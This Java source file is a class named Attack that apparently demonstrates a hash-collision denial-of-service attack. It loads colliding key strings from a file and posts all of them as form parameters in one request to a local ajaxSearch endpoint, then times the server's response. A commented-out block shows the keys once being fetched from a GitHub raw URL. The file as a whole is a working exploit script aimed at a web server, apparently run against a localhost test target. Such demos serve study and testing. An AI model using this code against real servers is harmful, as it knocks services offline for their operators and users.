package com.pcj.Dos;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.BasicHttpEntity;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Attack {

    public static void main(String[] args) throws IOException {
        String data = getStr("Hash.txt");
        List<String> split =  split(data);
        HttpClient httpClient = HttpClients.createDefault();
        HttpPost post = new HttpPost("http://127.0.0.1:8080/ajaxSearch");
        List list = new ArrayList <BasicNameValuePair>();
        list.add(new BasicNameValuePair("keyword","222"));
        for(String s:split){
            list.add(new BasicNameValuePair(s,"0"));
        }
        System.out.println(list.size());

        HttpEntity entity = new UrlEncodedFormEntity(list,"utf-8");
//        StringEntity entity = new StringEntity("{\"keyword\":\"666\",\"page\":456}");
//        entity.setContentEncoding("UTF-8");
        post.setEntity(entity);
        Long starTime = System.currentTimeMillis();
        HttpResponse response = httpClient.execute(post);
        Long endTime = System.currentTimeMillis();
        System.out.println(response.getStatusLine());
        System.out.println("请求时间"+(endTime-starTime)+"毫秒");

    }

    public static List<String> split(String str){
        String regx="\"[\\w]*\"";
        //1.将正在表达式封装成对象Patten 类来实现
        Pattern pattern = Pattern.compile(regx);
        //2.将字符串和正则表达式相关联
        Matcher matcher = pattern.matcher(str);
        //3.String 对象中的matches 方法就是通过这个Matcher和pattern来实现的。

//        System.out.println(matcher.matches());
        ArrayList<String> list = new ArrayList();
        //查找符合规则的子串
        while(matcher.find()){
            //获取 字符串
            String s = matcher.group();
           // System.out.println(s.substring(1,s.length()-1));
            list.add(s.substring(1,s.length()-1));
            //获取的字符串的首位置和末位置
//            System.out.println(matcher.start()+"--"+matcher.end());
        }
        return list;
    }

    public static String getStr(String fileName)throws IOException {
//        HttpClient client = HttpClients.createDefault();
//        HttpGet g = new HttpGet("https://raw.githubusercontent.com/laynefyc/php_thread_demo/master/javaHash.json");
//        HttpResponse response = client.execute(g);
//       String reslut = EntityUtils.toString(response.getEntity());
//        System.out.println(reslut);
//       return reslut;
        File file = new File(Attack.class.getClassLoader().getResource(fileName).getFile());
        BufferedReader read = new BufferedReader(new FileReader(file));
        StringBuilder builder = new StringBuilder();
        String tempString = null;
        while ((tempString = read.readLine())!=null){
            builder.append(tempString);
//            System.out.println(tempString);
        }
        return builder.toString();
    }
}
